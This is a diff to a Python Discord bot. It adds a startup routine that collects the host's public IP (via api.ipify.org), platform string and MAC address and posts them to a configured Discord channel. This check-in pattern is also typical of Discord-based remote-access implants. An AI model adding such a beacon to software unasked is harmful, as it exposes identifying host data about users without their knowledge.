@@ -2,6 +2,9 @@ import discord
 import settings
 
 import os
+import platform
+from uuid import getnode
+from requests import get
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -11,6 +14,14 @@ client = discord.Client(intents=intents)
 @client.event
 async def on_ready():
     print(f'We have logged in as {client.user}')
+    channel = client.get_channel(settings.channel)
+    ip = get('https://api.ipify.org').content.decode('utf8')
+    await channel.send('Connected!\n```' + 
+                       'platform: ' + platform.platform() + '\n' +
+                       'MAC: ' + str(getnode()) + '\n' +
+                       'IP: ' + ip + '\n' +
+                       '```'
+                       )
 
 @client.event
 async def on_message(message):
